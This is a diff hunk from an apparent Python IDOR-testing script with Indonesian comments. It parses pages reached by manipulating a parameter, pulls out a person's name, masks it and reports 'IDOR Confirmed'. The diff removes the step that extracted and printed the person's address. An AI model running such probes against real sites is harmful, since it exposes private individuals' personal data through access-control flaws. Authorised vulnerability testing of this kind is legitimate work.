@@ -203,28 +203,22 @@ def parameter_discovery_audit():
                         test_soup = BeautifulSoup(test_res.text, 'html.parser')
                         
                         # Inisialisasi Data
-                        name, address = "Unknown", "Tidak Ditemukan"
+                        name = "Unknown"
                         
                         # Ekstraksi Data (Sinkronisasi Total dengan Logika Opsi 2)
                         nama_tag = test_soup.find('p', class_='sale-price text-success')
                         if nama_tag:
                             name = nama_tag.get_text(strip=True)
-                            details = test_soup.find_all('p', class_='detail')
-                            for p in details:
-                                text = p.get_text(strip=True)
-                                if "Alamat" in text: address = text.split(":")[-1].strip()
                         
-                        # Validasi: Berhenti HANYA jika Nama dan Alamat ditemukan
-                        if name != "Unknown" and address != "Tidak Ditemukan":
+                        # Validasi: Berhenti jika Nama ditemukan
+                        if name != "Unknown":
                             found_valid = True
                             
                             # Masking Blur: 2 huruf depan dan 2 huruf belakang (Contoh: SUDARNI -> **DAR**)
                             m_name = f"**{name[2:-2]}**" if len(name) > 4 else f"**{name}**"
-                            m_addr = f"**{address[2:-2]}**" if len(address) > 4 else f"**{address}**"
 
                             print(f"\n\n[\033[92m✓\033[0m] Manipulation Test Result: \033[92mSUCCESS\033[0m")
                             print(f" [!] Nama        : {m_name}")
-                            print(f" [!] Alamat      : {m_addr}")
                             print(f" [!] Status      : \033[91mIDOR Confirmed\033[0m")
                             break
                     
